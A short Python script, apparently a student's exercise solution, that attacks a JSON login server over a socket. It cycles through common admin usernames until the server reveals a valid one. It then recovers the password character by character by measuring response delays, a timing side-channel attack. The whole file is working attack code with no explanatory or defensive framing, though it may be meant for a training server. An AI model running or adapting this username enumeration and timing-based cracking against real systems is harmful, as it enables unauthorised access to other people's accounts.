# write your code here
from sys import argv
import socket
import itertools
import json
import datetime

typ_log = ["admin", "Admin", "admin1", "admin2", "admin3", "user1", "user2", "root", "default", "new_user",
           "some_user", "new_admin", "administrator", "Administrator", "superuser", "super", "su", "alex",
           "suser", "rootuser", "adminadmin", "useruser", "superadmin", "username", "username1"]

dict_hack = {"login": "", "password": ""}

check_time = datetime.timedelta(microseconds=90000)

with socket.socket() as client_server:
    client_server.connect((argv[1], int(argv[2])))
    flag_pw = False
    flag_answer = False
    words = ("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
             "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
             "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
    client_server.send(json.dumps(dict_hack).encode())

    for login in typ_log:
        dict_hack["login"] = login
        client_server.send(json.dumps(dict_hack).encode())
        try:
            answer = json.loads(client_server.recv(2048).decode())["result"]
        except:
            continue
        if answer == "Wrong password!":
            flag_pw = True
            break
        elif answer == "Connection success!":
            print(json.dumps(dict_hack))
            flag_answer = True
            break
    password = ""
    while flag_pw:
        for letter in words:
            dict_hack["password"] = password + letter
            start = datetime.datetime.now()
            client_server.send(json.dumps(dict_hack).encode())
            try:
                answer = json.loads(client_server.recv(2048).decode())["result"]
            except:
                continue
            finish = datetime.datetime.now() - start
            if finish > check_time:
                password += letter
                break
            if answer == "Connection success!":
                print(json.dumps(dict_hack))
                flag_answer = True
                flag_pw = False
                break



